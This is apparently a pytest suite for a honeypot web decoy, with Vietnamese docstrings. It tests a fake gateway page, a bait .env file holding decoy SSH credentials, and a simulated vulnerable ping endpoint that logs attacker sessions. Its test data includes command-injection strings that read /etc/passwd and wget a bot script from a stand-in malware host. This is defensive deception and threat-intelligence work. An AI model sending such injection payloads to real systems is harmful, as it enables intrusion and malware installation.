#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import pytest
import json
from pathlib import Path
from gateway.web_decoy import app, extract_injected_commands, process_rce_payload
from threat_intel.logger import UNLABELED_SESSIONS_FILE


@pytest.fixture
def client():
    app.config["TESTING"] = True
    with app.test_client() as client:
        yield client


def test_web_index(client):
    """Kiểm tra trang chủ mồi nhử Web Portal"""
    res = client.get("/")
    assert res.status_code == 200
    assert b"Cloud Gateway" in res.data
    assert b"Network Diagnostic Tool" in res.data


def test_sensitive_file_leak(client):
    """Kiểm tra mồi nhử lộ file cấu hình .env chứa mật khẩu SSH"""
    res = client.get("/.env")
    assert res.status_code == 200
    assert b"SSH_INTERNAL_PORT" in res.data
    assert b"SSH_MAINTENANCE_USER=ubuntu" in res.data
    assert b"SSH_MAINTENANCE_PASS" in res.data


def test_command_extraction():
    """Kiểm tra trích xuất chính xác chuỗi lệnh shell từ URL Command Injection"""
    payload = "127.0.0.1;whoami;uname -a;wget http://malware.xyz/bot.sh"
    cmds = extract_injected_commands(payload)
    assert cmds == ["whoami", "uname -a", "wget http://malware.xyz/bot.sh"]


def test_vulnerable_ping_rce_endpoint(client):
    """Kiểm tra endpoint /api/ping nhận payload RCE, lưu full_session và trả về output mô phỏng"""
    payload = "127.0.0.1;whoami;id;cat /etc/passwd"
    res = client.get(f"/api/ping?host={payload}")
    assert res.status_code == 200
    text = res.data.decode("utf-8")
    assert "PING 127.0.0.1" in text
    assert "www-data" in text
    assert "uid=33(www-data)" in text
    assert "root:x:0:0:root" in text

    # Kiểm tra log unlabeled_sessions.jsonl
    assert UNLABELED_SESSIONS_FILE.exists()
    with open(UNLABELED_SESSIONS_FILE, "r", encoding="utf-8") as f:
        lines = [json.loads(l) for l in f if l.strip()]
        latest = lines[-1]
        assert "commands" in latest
        assert "full_session" in latest
        assert latest["full_session"].endswith(" ;")
        assert "whoami" in latest["commands"]
        assert "id" in latest["commands"]
